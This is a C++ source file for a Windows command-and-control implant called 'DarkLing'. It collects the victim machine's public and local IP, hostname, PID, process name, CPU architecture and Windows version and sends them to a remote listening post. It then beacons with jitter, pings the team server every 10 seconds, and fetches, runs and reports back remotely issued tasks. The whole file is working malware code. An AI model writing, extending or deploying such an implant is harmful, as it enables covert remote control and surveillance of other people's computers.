#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "tasks.h"

#include <shlwapi.h>
#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <cpr/cpr.h>
#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/asio/ip/host_name.hpp>
#include <boost/asio/io_service.hpp>
#include <boost/asio/ip/address.hpp>
#include <boost/asio/ip/udp.hpp>
#include <nlohmann/json.hpp>


using json = nlohmann::json;

// Function to send an asynchronous HTTP POST request with a payload to the listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {
    // Set all our request constants
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // Make an asynchronous HTTP POST request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Show the request contents
    std::cout << "Request body: " << requestBody << std::endl;

    // Return the body of the response from the listening post, may include new tasks
    return response.text;
};

// Method to enable/disable the running status on our implant
void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

std::string GetRegistry() // Needs Optimization because at the moment this function works but the code is very shit
{
    unsigned long size = 1024;
    HKEY registryHandle;
    const char* subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    const wchar_t* subkey2 = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";


    DWORD szValue;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &registryHandle);
    RegQueryValueExA(registryHandle, "CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
    std::string MajorVersion = std::to_string(szValue);

    RegQueryValueExA(registryHandle, "CurrentMinorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
    RegCloseKey(registryHandle);
    std::string MinorVersion = std::to_string(szValue);

    WCHAR szValue2[1024];
    DWORD bufferSize = sizeof(szValue2);
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey2, 0, KEY_READ, &registryHandle);
    RegQueryValueExW(registryHandle, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)&szValue2, &bufferSize);
    RegCloseKey(registryHandle);
    std::wstring ws(szValue2);
    std::string BuildNumber(ws.begin(),ws.end());


    std::stringstream ret;
    ret << MajorVersion << "." << MinorVersion << "." << BuildNumber;
    return ret.str();
}

std::string GetPublicIP() {
    try {
        // Construct our listening post endpoint URL from user args, only HTTP to start
        std::stringstream ss;
        ss << "https://api.ipify.org?format=text";
        std::string fullServerUrl = ss.str();

        // Make an asynchronous HTTP GET request to the api.ipify
        cpr::AsyncResponse asyncRequest = cpr::GetAsync(cpr::Url{ fullServerUrl });
        // Retrieve the response when it's ready
        cpr::Response response = asyncRequest.get();

        //std::cout << response.text << std::endl; // For debug

        // Return the body of the response from the listening post, may include new tasks
        return response.text;
    }
    catch (std::exception& e) {
        std::cerr << "Could not deal with socket. Exception: " << e.what() << std::endl;
    }
}

std::string GetMachineIP() {
    try {
        boost::asio::io_service netService;
        boost::asio::ip::udp::resolver   resolver(netService);
        boost::asio::ip::udp::resolver::query query(boost::asio::ip::udp::v4(), "google.com", "");
        boost::asio::ip::udp::resolver::iterator endpoints = resolver.resolve(query);
        boost::asio::ip::udp::endpoint ep = *endpoints;
        boost::asio::ip::udp::socket socket(netService);
        socket.connect(ep);
        boost::asio::ip::address addr = socket.local_endpoint().address();
        return addr.to_string();
    }
    catch (std::exception& e) {
        std::cerr << "Could not deal with socket. Exception: " << e.what() << std::endl;

    }
}

std::string GetProcessorArchirecture() {
    // SYSTEM_INFO structure
    SYSTEM_INFO siSysInfo;

    // Copy the hardware information to the SYSTEM_INFO structure
    GetSystemInfo(&siSysInfo);
    // Store Processor Arch in our local variable
    switch (siSysInfo.wProcessorArchitecture) {
    case 0:
        return "x86";
    case 6:
        return "Intel Itanium Processor Family";
    case 9:
        return "x64";
    case 0xffff:
    default:
        return "Unknown Architecture";
    }
}

std::string GetProcessName() {
    TCHAR path[1024];
    LPWSTR FileName;
    DWORD length;

    length = GetModuleFileName(NULL, path, 1000); // Gets the full path of our process
    FileName = PathFindFileName(path); // We pass the path and we get the FileName to our process :) aka lazy trick

    std::wstring t(FileName);
    std::string t2(t.begin(), t.end());


    return t2;

}

std::string GetPID() {
    DWORD pid = GetCurrentProcessId();
    return std::to_string(pid);
}

void Implant::beaconCheckIn(const char* url) {
    // Return Processor Arch
    std::string arch = GetProcessorArchirecture();
    // Store OS info in our local variable
    std::string osinfo = GetRegistry();
    // Local results variable and root for our ptree
    boost::property_tree::ptree resultsLocal;
    // Our results string that we will send to the server
    std::stringstream resultsStringStream;
    // Function from boost lib that gets the hostname and returns a string type
    std::string hostname = boost::asio::ip::host_name();
    // Functions from boost lib that gets the Machine IP address and Public IP
    std::string PublicIP = GetPublicIP();
    std::string machineIP = GetMachineIP();
    // Function that gets Beacon Process PID
    std::string PID = GetPID();
    // Function that gets current Proces Name;
    std::string nameProcess = GetProcessName();

    // Adding our results to the root ptree for json format
    resultsLocal.put("Public IP", PublicIP);
    resultsLocal.put("IP", machineIP);
    resultsLocal.put("Hostname", hostname);
    resultsLocal.put("PID", PID);
    resultsLocal.put("Process Name", nameProcess);
    resultsLocal.put("Architecture", arch);
    resultsLocal.put("Windows Version", osinfo);
    // Parsing to json format
    boost::property_tree::write_json(resultsStringStream,resultsLocal);
    sendHttpRequest(host,port, url, resultsStringStream.str());
}
// Method to ping teamserver every 10 seconds
void Implant::Pinger() {
    // Local results variable and root for our ptree
    boost::property_tree::ptree resultsLocal;
    // Our results string that we will send to the server
    std::stringstream resultsStringStream;

    // Adding our results to the root ptree for json format
    resultsLocal.put("PING", "PONG");
    // Parsing to json format
    boost::property_tree::write_json(resultsStringStream, resultsLocal);

    while (isRunning) { //While loop for ping every 10 seconds
        sendHttpRequest(host, port, "/ping", resultsStringStream.str());
        std::this_thread::sleep_for(std::chrono::seconds{ 10 });
    }
}

// Method to set the mean dwell time on our implant
void Implant::setMeanDwell(double meanDwell) {
    // Exponential_distribution allows random jitter generation
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

// Method to send task results and receive new tasks
[[nodiscard]] std::string Implant::sendResults() {
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    // A scoped lock to perform a swap
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    // Format result contents
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

// Method to parse tasks received from listening post
void Implant::parseTasks(const std::string& response) {
    // Local response variable
    std::stringstream responseStringStream{ response };

    // Read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree; // Create root
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    // Range based for-loop to parse tasks and push them into the tasks vector
    // Once this is done, the tasks are ready to be serviced by the implant
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); })
            );
        }
    }
}

// Loop and go through the tasks received from the listening post, then service them
void Implant::serviceTasks() {
    while (isRunning) {
        // Local tasks variable
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }
        // Range based for-loop to call the run() method on each task and add the results of tasks
        for (const auto& task : localTasks) {
            // Call run() on each task and we'll get back values for id, contents and success
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 3 });
    }
}

// Method to start beaconing to the listening post
void Implant::beacon() {
    while (isRunning) {
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try {
            std::cout << "DarkLing is sending results to listening post...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n================================================\n" << std::endl;
        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep for a set duration with jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono);
    }
}

// Initialize variables for our object
// constructor definition
Implant::Implant(std::string host, std::string port, std::string uri) :
    // Listening post endpoint URL arguments
    host{ std::move(host) }, // initializer list
    port{ std::move(port) }, // initializer list
    uri{ std::move(uri) }, // initializer list
    // Options for configuration settings
    isRunning{ true },
    dwellDistributionSeconds{ 0.4 },
    // Thread that runs all our tasks, performs asynchronous I/O
    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) },
    // Thread that runs our pinger
    pingerThread{ std::async(std::launch::async, [this] { Pinger(); }) } {
} 
